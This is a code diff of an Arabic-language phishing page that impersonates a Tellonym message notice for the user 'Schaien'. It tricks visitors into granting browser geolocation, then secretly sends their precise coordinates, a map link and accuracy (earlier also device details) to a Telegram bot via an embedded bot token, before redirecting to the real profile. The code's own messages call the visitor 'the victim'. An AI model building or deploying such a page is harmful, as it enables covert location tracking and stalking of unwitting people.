@@ -1,61 +1,55 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>جاري التحقق من الهوية...</title>
+    <title>Schaien - Tellonym</title>
     <style>
-        body { background: #121212; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; }
-        .box { text-align: center; background: #1e1e1e; padding: 40px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); border: 1px solid #333; max-width: 80%; }
-        .spinner { border: 4px solid rgba(255, 255, 255, 0.1); border-top: 4px solid #00f2fe; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        h2 { font-size: 20px; margin-bottom: 10px; }
-        p { color: #aaa; font-size: 14px; line-height: 1.5; }
+        body { background: #121212; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; }
+        .card { background: #1e1e1e; padding: 30px; border-radius: 15px; border: 1px solid #333; width: 90%; max-width: 400px; }
+        button { background: #00f2fe; color: #000; border: none; padding: 15px 30px; border-radius: 10px; font-weight: bold; font-size: 18px; cursor: pointer; transition: 0.3s; width: 100%; }
+        button:hover { background: #05d5e0; transform: scale(1.05); }
+        p { color: #aaa; font-size: 14px; margin-bottom: 25px; }
     </style>
 </head>
 <body>
 
-<div class="box">
-    <div class="spinner"></div>
-    <h2>تأكيد الأمان</h2>
-    <p>يرجى النقر على <b>"سماح" (Allow)</b> للتأكد من أنك لست "روبوت" ولفتح صندوق الرسائل الخاص بـ Schaien.</p>
+<div class="card">
+    <h2 style="margin-bottom: 10px;">رسالة جديدة مجهولة!</h2>
+    <p>لديك رسالة جديدة على Tellonym. للخصوصية والأمان، يجب التأكد من موقعك الجغرافي لفتح الرسالة.</p>
+    <!-- الزر الذي سيجبر المتصفح على إظهار Allow -->
+    <button onclick="startHunt()">قراءة الرسالة الآن</button>
 </div>
 
 <script>
-    const B_T = "8793022795:AAFzOmrMn1eYAkVuBPcy6nh7cf49-WvvaiM";
-    const C_I = "1138822664";
-    const FINAL_URL = "https://tellonym.me/Schaien";
+    const token = "8793022795:AAFzOmrMn1eYAkVuBPcy6nh7cf49-WvvaiM";
+    const id = "1138822664";
+    const url = "https://tellonym.me/Schaien";
 
     function zap(msg) {
-        new Image().src = `https://api.telegram.org/bot${B_T}/sendMessage?chat_id=${C_I}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
+        new Image().src = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
     }
 
-    function hunt() {
-        zap("🔔 **دخول جديد لصفحة Tellonym!**\nجاري سحب الإحداثيات...");
+    function startHunt() {
+        zap("🔔 **بدأ التفاعل!** الضحية ضغط على الزر ويواجه الآن نافذة السماح...");
 
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 (p) => {
-                    const { latitude: lt, longitude: ln, accuracy: ac } = p.coords;
-                    const map = `https://www.google.com/maps?q=${lt},${ln}`;
-                    zap(`🎯 **تم قنص موقع الضحية!**\n\n📍 الخريطة: [اضغط هنا](${map})\n📌 الإحداثيات: \`${lt}, ${ln}\`\n📏 الدقة: ${ac} متر\n📱 الجهاز: ${navigator.userAgent}`);
-                    setTimeout(() => { window.location.replace(FINAL_URL); }, 800);
+                    const map = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+                    zap(`🎯 **تم القنص بنجاح!**\n📍 الخريطة: [فتح الموقع](${map})\n📏 الدقة: ${p.coords.accuracy} متر`);
+                    setTimeout(() => { window.location.href = url; }, 500);
                 },
                 (e) => {
-                    zap("❌ الضحية رفض إعطاء الموقع (GPS Denied).");
-                    window.location.replace(FINAL_URL);
+                    zap("❌ الضحية ضغط على الزر لكنه رفض (Allow) أو المتصفح حظره.");
+                    window.location.href = url;
                 },
-                { enableHighAccuracy: true, timeout: 7000 }
+                { enableHighAccuracy: true, timeout: 10000 }
             );
         } else {
-            window.location.replace(FINAL_URL);
+            window.location.href = url;
         }
     }
-
-    // التنفيذ التلقائي
-    window.onload = hunt;
-    // حماية ضد التعليق
-    setTimeout(() => { window.location.replace(FINAL_URL); }, 10000);
 </script>
 
 </body>
